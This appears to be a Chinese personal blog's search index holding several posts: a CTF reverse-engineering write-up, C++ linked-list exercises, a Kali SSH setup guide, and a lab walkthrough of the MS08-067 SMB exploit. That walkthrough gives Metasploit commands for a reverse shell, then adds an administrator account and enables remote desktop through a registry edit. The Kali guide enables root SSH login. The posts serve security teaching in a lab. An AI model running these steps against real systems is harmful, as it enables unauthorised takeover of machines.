<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hack.lu-2017 The_Maya_Society题解</title>
    <link href="/2020/03/12/the-maya-society/"/>
    <url>/2020/03/12/the-maya-society/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在逆向面前，dyn无时无刻都在感受自己的渺小。。。</p></blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/media/task/attachments/17574fc423474b93a0e6e6a6e583e003.zip" target="_blank" rel="noopener">https://adworld.xctf.org.cn/media/task/attachments/17574fc423474b93a0e6e6a6e583e003.zip</a></p><p>题目描述：无</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到这道题之后，看到html文件和launcher程序，当时没明白html文件的作用，做完之后怀疑是下载launcher程序用的。</p><p><a href="https://imgchr.com/i/8mt3o6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mt3o6.png" srcset="/img/loading.gif" alt="8mt3o6.png" border="0" /></a></p><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>将程序导入peid，经查，无壳，elf文件，64bit</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老规矩，用gdb-pwndbg和ida进行联合调试</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><blockquote><p>恕在下孤陋寡闻，静态分析相比于很多大神的思路差的太远，不过还是看到了一些有用的东西</p></blockquote><p><a href="https://imgchr.com/i/8mdIu4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mdIu4.png" srcset="/img/loading.gif" alt="8mdIu4.png" border="0" /></a></p><p>这里应该是一个md5加密，疑似是对不明格式时间字符串进行加密</p><p><a href="https://imgchr.com/i/8m0GFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8m0GFI.png" srcset="/img/loading.gif" alt="8m0GFI.png" border="0" /></a></p><p>这一串可能是几串字符串的合并过程</p><p><a href="https://imgchr.com/i/8m040J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8m040J.png" srcset="/img/loading.gif" alt="8m040J.png" border="0" /></a></p><p>这个函数我没看懂。。。</p><p><a href="https://imgchr.com/i/8mBkjS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mBkjS.png" srcset="/img/loading.gif" alt="8mBkjS.png" border="0" /></a></p><p>base64解密</p><p><a href="https://imgchr.com/i/8mBf8P" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8mBf8P.png" srcset="/img/loading.gif" alt="8mBf8P.png" border="0" /></a></p><p>异或0x25</p><p>经过一系列静态分析和试运行，我发现了一些关键点：题目中没有输入，很可能是对时间进行加解密（这个就可以确定时间是我们需要修改的），加密过程经过了md5，字符串合成，18a4函数，b64，异或0x25得到flag</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>下面我们进入动态调试，第一次先不改时间，前面都照常运行，而且我们发现合并的字符串是md5加密后的时间与”.fluxfingers.net”合成。但是进入18a4之后出现了问题，我们发现只有正确的时间才能使程序完成判断过程继续执行，显然这个时间是一定要得到的（后面加密完全是依靠时间），因此我们看一下题目：maya，html里满满的世界末日气息。。。那就猜2012-12-21，开始正式的调试。</p><p>首先在1a8C处下断点，将rax寄存器的时间串修改为2012-12-21</p><p>之后再18a4断下，发现程序能够正常执行，并得到了一串base64字符串</p><p>其实到这一步，我们已经可以脱离调试器：解码base64，异或0x25，得到flag，当然，也可以选择调试到最后</p><blockquote><p>在这里，dyn跳的有点多了，导致自己丢了（也可能是没找到）最后的flag，但是没关系，我们找到了异或0x25之前的数据，把数据导出来异或一样可以得到flag</p></blockquote><p><a href="https://imgchr.com/i/8myCVg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/12/8myCVg.png" srcset="/img/loading.gif" alt="8myCVg.png" border="0" /></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题脑洞是真的大，也算是让我费了很大的精力（早晚死于调试），不过能得到flag还是很高兴的。</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>Re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线性表练习整理</title>
    <link href="/2020/03/11/linklist3/"/>
    <url>/2020/03/11/linklist3/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这是上周老师布置的线性表和链表的一些习题，现在把代码粘在这里<br>从本期开始，鄙人将开始完全放飞自我，不会吝啬任何标准库C++语句（保证数据结构为C语言结构以及设计思想仍为面向过程）</p></blockquote><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><h3 id="question1-插入"><a href="#question1-插入" class="headerlink" title="question1 插入"></a>question1 插入</h3><p><a href="https://imgchr.com/i/8EB81g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/11/8EB81g.md.png" srcset="/img/loading.gif" alt="8EB81g.png" border="0" /></a></p><blockquote><p>tips：为了加快遍历速度。采用了二分查找</p></blockquote><pre><code class="C++">#include&lt;iostream&gt;using namespace std;int search(int n,int x,int *p) //二分查找，确定插入位置 {    int l=0,r=n-1,mid=(l+r)/2;    if(p[r]&lt;x)        return r+1;     while(l&lt;r)    {        if(x&lt;p[mid])        {            r=mid;            mid=(l+r)/2;        }        else        {            l=mid+1;            mid=(l+r)/2;        }    }    return mid;}int main(){    int a,b;    cout&lt;&lt;&quot;input length&quot;&lt;&lt;endl;    cin&gt;&gt;a; //输入数组长度    int *p=new int[a+1];    for(int i=0;i&lt;a;i++){        cin&gt;&gt;p[i] ;        if(i&gt;0){            if(p[i]&lt;=p[i-1]){                cout&lt;&lt;&quot;invalid!&quot;&lt;&lt;endl; //如果数组不是递增排列，则显示非法                 return 1;            }        }    }      cout&lt;&lt;&quot;input num u want insert&quot;&lt;&lt;endl;    cin&gt;&gt;b; //输入要插入的数     int pos=search(a,b,p);    //cout&lt;&lt;pos;    //重排数组     for(int i=a;i&gt;pos;i--){        p[i]=p[i-1];    }     p[pos]=b;    //输出     for(int i=0;i&lt;=a;++i)    {        printf(&quot;%d &quot;,p[i]);    }    return 0;}</code></pre><h3 id="question2-就地逆置"><a href="#question2-就地逆置" class="headerlink" title="question2 就地逆置"></a>question2 就地逆置</h3><p><a href="https://imgchr.com/i/8EBgBR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/11/8EBgBR.md.png" srcset="/img/loading.gif" alt="8EBgBR.png" border="0" /></a></p><pre><code class="C++">#include &lt;iostream&gt;using namespace std;void Reverse(int *L,int len){   int i,temp;   for(i = 0; i &lt; len/2; i++){        temp = *(L+i);        *(L+i)= *(L+len-i-1);        *(L+len-i-1)= temp;   }}int main(){    int a,b;    cout&lt;&lt;&quot;input length&quot;&lt;&lt;endl;    cin&gt;&gt;a; //输入数组长度    int *p=new int[a+1];    for(int i=0;i&lt;a;i++){        cin&gt;&gt;p[i] ;    }      Reverse(p,a);     for(int i=0;i&lt;a;i++){        cout&lt;&lt;p[i] ;    }  }</code></pre><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p><a href="https://imgchr.com/i/8ErDOJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/11/8ErDOJ.md.png" srcset="/img/loading.gif" alt="8ErDOJ.png" border="0" /></a></p><h3 id="question1-删除元素"><a href="#question1-删除元素" class="headerlink" title="question1 删除元素"></a>question1 删除元素</h3><blockquote><p>这个没什么可说的，基本操作</p></blockquote><pre><code class="C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt; using namespace std;typedef struct node {    int data;    node* next;}node, * linklist;//创建链表void create(linklist &amp;p) {    p = new node;    int len,num;    linklist tmp, tmp2;    p-&gt;next = NULL;    tmp = p;    cout &lt;&lt; &quot;length&quot; &lt;&lt; endl; //输入链表长度    cin &gt;&gt; len;    cout &lt;&lt; &quot;input data&quot; &lt;&lt; endl;;    for (int i = 0; i &lt; len; i++) {        cin &gt;&gt; num;  //输入数据        tmp2 = new node;        tmp2-&gt;data = num;        tmp2-&gt;next = NULL;        tmp-&gt;next = tmp2;        tmp = tmp-&gt;next;    }}//删除元素void del(linklist &amp;p,int mink,int maxk) {    linklist a,b;    a = p;    b = p;    while (a-&gt;next-&gt;data &lt; mink) {        a = a-&gt;next;        b = b-&gt;next;    }    while (b-&gt;next-&gt;data &lt;= maxk ) {        b = b-&gt;next;        if (b-&gt;next == NULL) {            break;        }    }    a-&gt;next = b-&gt;next;}int main() {    linklist p;    create(p);    int mink, maxk;    cout &lt;&lt; &quot;input min and max&quot; &lt;&lt; endl;    cin &gt;&gt; mink &gt;&gt; maxk;    del(p, mink, maxk);    cout &lt;&lt; &quot;answer：&quot; &lt;&lt; endl;;    //打印链表    while (p-&gt;next != NULL) {        cout &lt;&lt; p-&gt;next-&gt;data&lt;&lt;&quot; &quot;;            p = p-&gt;next;    }}</code></pre><h3 id="question2-循环链表就地逆置"><a href="#question2-循环链表就地逆置" class="headerlink" title="question2 循环链表就地逆置"></a>question2 循环链表就地逆置</h3><blockquote><p>tips：和单链表逆置比起来可能更简单，毕竟不需要判断位置(循环长度)</p></blockquote><pre><code class="C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt; using namespace std;typedef struct node {    int data;    node* next;}node, * linklist;//创建链表int create(linklist &amp;p) {    p = new node;    int len,num;    linklist tmp, tmp2;    p-&gt;next = NULL;    tmp = p;    cout &lt;&lt; &quot;length&quot; &lt;&lt; endl; //输入链表长度    cin &gt;&gt; len;    cout &lt;&lt; &quot;input data&quot; &lt;&lt; endl;;    for (int i = 0; i &lt; len; i++) {        cin &gt;&gt; num;  //输入数据        if (i == 0) {            p-&gt;data = num;            continue;        }        tmp2 = new node;        tmp2-&gt;data = num;        tmp2-&gt;next = NULL;        tmp-&gt;next = tmp2;        tmp = tmp-&gt;next;    }    tmp-&gt;next = p;    return len;}//逆置链表void reverse(linklist &amp;p,int len) {    linklist a, b,c;    //判断链表是否非法    if (p == NULL || p-&gt;next == NULL) {        cout &lt;&lt; &quot;invalid!&quot; &lt;&lt; endl;        return;    }    a = p;    b = p-&gt;next;    c = p-&gt;next-&gt;next;    a-&gt;next = NULL;    for (int i = 0; i &lt; len; i++) {        b-&gt;next = a;        a = b;        b = c;        if (i == len - 1) {            continue;        }        c = c-&gt;next;            }}int main() {    linklist p;    int num=create(p);    reverse(p, num);    cout &lt;&lt; &quot;answer：&quot; &lt;&lt; endl;;    //打印链表    for(int i=0;i&lt;num;i++) {        cout &lt;&lt; p-&gt;data&lt;&lt;&quot; &quot;;            p = p-&gt;next;    }}</code></pre><h3 id="question3-计算多项式"><a href="#question3-计算多项式" class="headerlink" title="question3 计算多项式"></a>question3 计算多项式</h3><blockquote><p>tips：把系数也作为数据存入结点</p></blockquote><pre><code class="C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt; using namespace std;typedef struct node {    int data;    int factorial;    node* next;}node, * linklist;//创建链表int create(linklist&amp; p) {    p = new node;    int len, num, num2;    linklist tmp, tmp2;    p-&gt;next = NULL;    tmp = p;    cout &lt;&lt; &quot;length&quot; &lt;&lt; endl; //输入链表长度    cin &gt;&gt; len;    cout &lt;&lt; &quot;input data and factorial&quot; &lt;&lt; endl; //输入系数和阶乘    for (int i = 0; i &lt; len; i++) {        cin &gt;&gt; num &gt;&gt; num2;  //输入数据        tmp2 = new node;        tmp2-&gt;data = num;        tmp2-&gt;factorial = num2;        tmp2-&gt;next = NULL;        tmp-&gt;next = tmp2;        tmp = tmp-&gt;next;    }    return len;}//计算,参数为链表和变量int calc(linklist&amp; p, int num) {    linklist tmp = p;    int ans = 0;    while (tmp-&gt;next != NULL) {        tmp = tmp-&gt;next;        ans = ans + tmp-&gt;data * (pow(num, tmp-&gt;factorial));    }    return ans;}int main() {    linklist p;    int num, sum;    create(p);    cout &lt;&lt; &quot;imput data&quot; &lt;&lt; endl;    cin &gt;&gt; num;    sum = calc(p, num);    cout &lt;&lt; &quot;answer：&quot; &lt;&lt; sum &lt;&lt; endl;}</code></pre><h3 id="插入-就地逆置"><a href="#插入-就地逆置" class="headerlink" title="插入+就地逆置"></a>插入+就地逆置</h3><blockquote><p>tips：最简单的办法就是插入之后逆置。提高时间复杂度可以考虑边插入边逆置，但这么做需要考虑一些判断和循环，比较费时间（好吧，我又懒了），所以我才用了相对省脑子的解法<br>这个代码我并不是很满意，当时写的时候写错了一个逻辑，然后用调试器调的错误，以后有时间会把这个代码重写一下</p></blockquote><pre><code class="C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt; using namespace std;typedef struct node {    int data;    node* next;}node, * linklist;//创建链表int create(linklist&amp; p) {    p = new node;    int len, num;    linklist tmp, tmp2;    p-&gt;next = NULL;    tmp = p;    cout &lt;&lt; &quot;length&quot; &lt;&lt; endl; //输入链表长度    cin &gt;&gt; len;    cout &lt;&lt; &quot;input data&quot; &lt;&lt; endl; //输入数据    for (int i = 0; i &lt; len; i++) {        cin &gt;&gt; num ;  //输入数据        tmp2 = new node;        tmp2-&gt;data = num;        tmp2-&gt;next = NULL;        tmp-&gt;next = tmp2;        tmp = tmp-&gt;next;    }    return len;}void insert(linklist&amp; pa, linklist&amp; pb) {    linklist a1 = pa;    linklist b1 = pb;    int num = 0;    linklist a2 = pa-&gt;next;    b1 = b1-&gt;next;    while (a2 !=NULL &amp;&amp; b1 != NULL) {        if (b1-&gt;data &lt;= a2-&gt;data) {            linklist tmp = a1;            tmp -&gt; next = b1;            linklist tmp2 = b1;            b1 = b1-&gt;next;            tmp2-&gt;next = a2;            a1 = tmp2;            num = 0;        }        else if (b1-&gt;data &gt; a2-&gt;data) {            a1 = a1-&gt;next;            if (a2-&gt;next == NULL) {                num = 1;                break;            }            a2 = a2-&gt;next;            num = 1;        }        }    if (num == 1) {        a2-&gt;next = b1;    }}linklist reverse(linklist &amp;pa){    linklist p1 = pa;    linklist p2 = pa-&gt;next;    linklist p3 = pa-&gt;next-&gt;next;    p1-&gt;next = NULL;    while (p2-&gt;next != NULL) {        p2-&gt;next = p1;        p1 = p2;        p2 = p3;        p3 = p3-&gt;next;    }    p2-&gt;next = p1;    return p2;}void print(linklist&amp; pa) {    linklist tmp = pa;    while (tmp-&gt;next != NULL) {        cout &lt;&lt; tmp-&gt;data &lt;&lt; endl;        tmp = tmp-&gt;next;    }}int main() {    linklist pa,pb,pc;    int num;    create(pa);    create(pb);    insert(pa, pb);    pc=reverse(pa);    //print(pa);    //print(pb);    //reverse(pa);    print(pc);}</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>代码问题还是有很多的，毕竟为了应付作业，没太考虑简化代码，欢迎大家提出意见</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms08_067经典漏洞复现</title>
    <link href="/2020/03/10/dig2/"/>
    <url>/2020/03/10/dig2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>不要理会下面那句虎狼之词，继续搬运</p></blockquote><blockquote><p>我竟然把这个坑填下去了，可喜可贺。(填下去个锤子！from半年后的自己)</p></blockquote><h2 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h2><blockquote><p>刑法第二百八十六条违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。</p></blockquote><p>一定要清楚，我们做的是安全，一切的目的是更好的保护自己和他人。切记，切记！</p><h2 id="ms08-067"><a href="#ms08-067" class="headerlink" title="ms08_067"></a>ms08_067</h2><p>ms08_067是微软win操作系统中存在的一个服务器服务漏洞，在win server2008之前的系统都会受这个漏洞影响，黑客可以利用这个漏洞控制目标系统。</p><h2 id="操作概述"><a href="#操作概述" class="headerlink" title="操作概述"></a>操作概述</h2><p>使用kali linux攻击机对win xp系统利用此漏洞进行攻击，在靶机上建立管理员账号并远程控制靶机。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>kali linux攻击机（上一篇博客提到过）</p><p>win xp sp3 english（纯净版，不带任何补丁）</p><h2 id="控制靶机"><a href="#控制靶机" class="headerlink" title="控制靶机"></a>控制靶机</h2><p>进入kali终端，输入以下命令运行msf：</p><blockquote><p>msfconsole</p></blockquote><p>寻找并使用模块</p><p>我们要找的是ms08_067漏洞，所以我们首先寻找此漏洞</p><blockquote><p>search ms08_067_netapi</p></blockquote><p>我们找到漏洞后，使用此漏洞</p><blockquote><p>use exploit/windows/smb/ms08_067_netapi</p></blockquote><p>加载攻击载体</p><p>攻击载体有很多，我们这次使用shell_reverse_tcp（如果对渗透后攻击有想法的推荐Meterpreter）</p><blockquote><p>set payload generic/shell_reverse_tcp </p></blockquote><p>设置ip</p><p>LHOST为攻击机ip，RHOST为靶机ip，例如：</p><blockquote><p>set LHOST 192.168.1.62</p></blockquote><p>寻找对应版本target</p><p>target需要与靶机系统版本对应，在不确定版本时设置target为0也可自动选择</p><blockquote><p>set target 0</p></blockquote><p>运行</p><blockquote><p>exploit</p></blockquote><p>到此，我们就进入了靶机系统，你的kali Terminal应该显示以下信息。<br><a href="https://imgchr.com/i/8Progs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8Progs.md.png" srcset="/img/loading.gif" alt="8Progs.png" border="0" /></a></p><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><p>接下来，我们尝试在靶机上创建账户并使用远程桌面连接靶机，</p><p>首先，我们创建一个账户。</p><blockquote><p>user net host-name password /add</p></blockquote><p>提升为管理员权限</p><blockquote><p>net localgroup administrators host-name /add</p></blockquote><p>winxp远程操控端口为3389，我们将这个端口打开</p><blockquote><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p></blockquote><p>使用netstat查看端口</p><blockquote><p>netstat -an</p></blockquote><p>这时，我们会发现3389端口处于开启状态。</p><p>然后，我们可以用局域网内的计算机远程桌面连接到靶机，win10运行——&gt;MSTSC。</p><p>以上就是ms08_067漏洞利用复现的全过程。</p><h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="访问445端口被拒绝"><a href="#访问445端口被拒绝" class="headerlink" title="访问445端口被拒绝"></a>访问445端口被拒绝</h3><p>装了445端口补丁的winxp将445端口停用，所以复现此例程时不要使用带补丁的win xp。</p><p>还有可能是因为靶机打开了防火墙，复现时需要将防火墙关闭。</p><h3 id="设置target"><a href="#设置target" class="headerlink" title="设置target"></a>设置target</h3><p>如果不设置target，将不会判断靶机的系统版本进行攻击。建议将target设置为0，target为0时会自动判断靶机系统版本攻击。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>winxp上的漏洞其实还有很多，感兴趣的同学可以查一下其他的漏洞并尝试复现，折腾永不停止！</p>]]></content>
    
    
    <categories>
      
      <category>渗透攻击实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>漏洞利用</tag>
      
      <tag>科普</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建kali攻击机及windows远程连接（科普向）</title>
    <link href="/2020/03/10/dig1/"/>
    <url>/2020/03/10/dig1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>继续移植之前的存货</p></blockquote><blockquote><p>想开个漏洞攻击的坑，不知道能不能填上。（这句话tmd是我半年前写的,然后一共没更几期）</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>漏洞利用（英语：Exploit，本意为“利用”）是计算机安全术语，指的是利用程序中的某些漏洞，来得到计算机的控制权（使自己编写的代码越过具有漏洞的程序的限制，从而获得运行权限）。在英语中，本词也是名词，表示为了利用漏洞而编写的攻击程序，即漏洞利用程序（维基百科）</p><p>通俗的说，就是我们利用程序的漏洞控制程序的过程。（沃.兹及硕德）</p><h2 id="攻击机搭建"><a href="#攻击机搭建" class="headerlink" title="攻击机搭建"></a>攻击机搭建</h2><p>我们使用kali linux作为攻击机，kali是基于debian的linux发行版，载有很多渗透测试和攻击程序，是一个很牛逼的攻击平台。</p><p>系统安装的过程很简单，我们从北邮人下载kali linux，（当然官网下载也可以，直接百度kali就能找到链接）然后制作USB镜像，U盘引导启动即可。</p><p>当然，kali也可以安装在虚拟机上，但由于本人电脑内存不太够，所以就没这么玩。</p><p>科中的kali安装在我的U盘上，有需求的同学可以到.62体验，U盘引导启动进入kali，硬盘引导启动进入ubuntu16.04。</p><p>4  windows远程连接</p><p>kali装完了，下一个问题出现了，我们基地有几十名同学，总不能每一次想用kali都到我这去用，这样会很麻烦（这样我会很烦），因此我们要做一个windows远程连接。</p><p>说明：kali linux科中已经配置完成，不要在.62重新配置（无关人员自行跳过）</p><p>首先，我们打开kali的控制台（ctrl+alt+t）</p><p>我们先查看kali的ssh配置</p><blockquote><p>/etc/ssh/sshd_config</p></blockquote><p>然后，我们将以下变量按照下面的代码修改</p><pre><code>port 22PermitRootLogin yesPubkeyAuthentication yes</code></pre><p>保存退出(wq)</p><p>输入下面的命令打开kali ssh（每次开机都要重新打开）</p><blockquote><p>service ssh start</p></blockquote><p>输入ifconfig（注意，不是ipconfig）查看ip</p><p>记下ip和上面的port 22。</p><p>(以上过程科中已经配置完成，不需要重新配置）</p><p>回到自己的电脑，我们使用Xshell进行远程连接，下载Xshell就不贴地址了，google是你的好朋友。</p><p>新建会话属性——&gt;主机ip设置，端口设置——&gt;创建<br><a href="https://imgchr.com/i/8P0og1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8P0og1.jpg" srcset="/img/loading.gif" alt="8P0og1.jpg" border="0" /></a><br>打开——&gt;连接——&gt;你建的会话的名字<br><a href="https://imgchr.com/i/8P0z8A" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8P0z8A.jpg" srcset="/img/loading.gif" alt="8P0z8A.jpg" border="0" /></a></p><p>会提示你输入root密码，密码科中的同学们应该都知道，不知道的问我也行。(如果你是路人的话你自己搭的肯定知道密码。。。下面的回复好奇怪)</p><p>如果运行成功，会显示root@kali，这代表你进入了kali的终端。</p><p>尝试ifconfig<br><a href="https://imgchr.com/i/8PBe8s" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8PBe8s.jpg" srcset="/img/loading.gif" alt="8PBe8s.jpg" border="0" /></a></p><p>快乐由此开始</p>]]></content>
    
    
    <categories>
      
      <category>渗透攻击实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>漏洞利用</tag>
      
      <tag>科普</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表变体与约瑟夫环</title>
    <link href="/2020/03/10/linklist2/"/>
    <url>/2020/03/10/linklist2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这一章节如果涉及到算法其实还是挺多的，但是基本知识基本上跟单链表没啥区别。</p></blockquote><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>了解循环链表，双向链表（这一部分真的不想贴代码了，跟单链表感觉没啥区别，都是操作指针。</p><h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p>没啥特别的，单链表尾指针指向头节点。</p><h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p>插入：<br>和单链表一样，需要辅助链表定位插入的前后结点，操作基本与单链表相同，只是多调整一个前指针而已。</p><p>删除：<br>参考单链表删除，调整结点指针，释放目标空间。</p><h2 id="小游戏：约瑟夫环"><a href="#小游戏：约瑟夫环" class="headerlink" title="小游戏：约瑟夫环"></a>小游戏：约瑟夫环</h2><p>下面玩个有意思的：约瑟夫和他的40个战友被罗马军队包围在洞中。他们讨论是自杀还是被俘，最终决定自杀，自杀方法是，大家轮流报数，报到7的人自杀，直到所有人死去。约瑟夫斯和另外一个人是最后两个留下的人。约瑟夫斯说服了那个人，他们将向罗马军队投降，不再自杀。约瑟夫斯把他的存活归因于运气或天意，他不知道是哪一个。</p><p>事实上，我们可以通过循环链表解决这个问题。</p><blockquote><p>tips：本期初始化函数已经开始使用new，但仍然采用C语言的参数传递模式，在下一期开始将完全使用C++引用模式以简化程序。同时，cout，cin函数及C++头文件已经引入，用于简化程序。</p></blockquote><p>完整源码：</p><pre><code class="C++">#include &lt;iostream&gt;#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;using namespace std;typedef struct node { int data; node* next;}node, * linklist;//创建循环链表linklist create() { node* p; p = new node; p-&gt;next = NULL; p-&gt;data = 41; for (int i = 1; i &lt; 41; i++) {  node* q = new node;  q-&gt;next = p-&gt;next;  q-&gt;data = 41 - i;  p-&gt;next = q;  if (i == 1) {   q-&gt;next = p;  } } return p;}int main() { node* joseph = new node; joseph = create(); node* t = joseph; node* tmp = joseph; node* tmp2; int num = 0; int count = 0; //开始递进 for (int i = 0; ; i++) {  tmp2 = tmp;  tmp = tmp-&gt;next;  num = num + 1;  //到7删除  if (num == 7) {   tmp2-&gt;next = tmp-&gt;next;   free(tmp);   tmp = tmp2-&gt;next;   num = 1;   count++;  }  //剩两人跳出  if (count == 39) {   break;  } } //结果输出 cout &lt;&lt; tmp-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; tmp-&gt;next-&gt;data;} </code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>上面的代码可能并不是很简单，但符合我的编写习惯，欢迎大家给我提意见。<br>约瑟夫环事实上可以使用递归求解，当然理解难度较大，有兴趣的同学可以查一下。</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单链表</title>
    <link href="/2020/03/10/linklist/"/>
    <url>/2020/03/10/linklist/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本栏目是我新博客的第一个栏目，写这个栏目的原因是这学期有数据结构课程，一方面让自己复习一下，另一方面希望能帮助到有需要的同学。本栏目使用语言为C++，但由于课程要求为类C，且大部分同学没有C++经验，因此大部分语言结构基于C语言。</p></blockquote><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>单链表的初始化，建立，插入，查找，删除</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>单链表的结构很简单：仅由数据和指针组成</p><pre><code class="C++">typedef struct Node{    int data;              //单链表中的数据域 ，本示例用的int型    struct Node *next;          //单链表的指针域 }Node,*LinkedList;</code></pre><h3 id="初始化链表过程："><a href="#初始化链表过程：" class="headerlink" title="初始化链表过程："></a>初始化链表过程：</h3><pre><code class="C++">LinkedList LinkedListInit(){    Node *L;    L = (Node *)malloc(sizeof(Node));   //申请结点空间     if(L == NULL)                       //判断是否有足够的内存空间         printf(&quot;申请内存空间失败/n&quot;);    L-&gt;next = NULL;                  //将next设置为NULL,初始长度为0的单链表 }</code></pre><h2 id="建立"><a href="#建立" class="headerlink" title="建立"></a>建立</h2><p>建立链表分为头插法和尾插法</p><h3 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h3><p>头插法，就是每一次插入都是从链表头插入，实现也比较简单：</p><pre><code class="C++">LinkedList LinkedListCreatH(){    Node *L;    L = (Node *)malloc(sizeof(Node));   //申请头结点空间    L-&gt;next = NULL;                      //初始化一个空链表    int x;                         //x为链表数据域中的数据    while(scanf(&quot;%d&quot;,&amp;x) != EOF)    {        Node *p;        p = (Node *)malloc(sizeof(Node));   //申请新的结点         p-&gt;data = x;                     //结点数据域赋值         p-&gt;next = L-&gt;next;                           L-&gt;next = p;     }    return L; } </code></pre><h3 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h3><p>每一次从链表尾部插入，这一过程通常需要借助一个辅助链表，简要描述此过程：</p><p>1 辅助链表r和原始链表L重合</p><p>2 创建P，给P赋值</p><p>3 将原始链表空指针指向p，将r指向尾结点</p><pre><code class="C++">LinkedList LinkedListCreatT(){    Node *L;    L = (Node *)malloc(sizeof(Node));   //申请头结点空间    L-&gt;next = NULL;                  //初始化一个空链表    Node *r;    r = L;                          //r始终指向终端结点，开始时指向头结点     int x;                         //x为链表数据域中的数据    while(scanf(&quot;%d&quot;,&amp;x) != EOF)    {        Node *p;        p = (Node *)malloc(sizeof(Node));   //申请新的结点         p-&gt;data = x;                     //结点数据域赋值         r-&gt;next = p;                 //将结点插入到表头L--&gt;|1|--&gt;|2|--&gt;NULL         r = p;     }    r-&gt;next = NULL;     return L;   }  </code></pre><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p>了解了建立链表，插入就简单了，例如在i位置插入x</p><pre><code class="C++">LinkedList LinkedListInsert(LinkedList L,int i,int x){    Node *pre;                      //pre为前驱结点     pre = L;    int tempi = 0;    for (tempi = 1; tempi &lt; i; 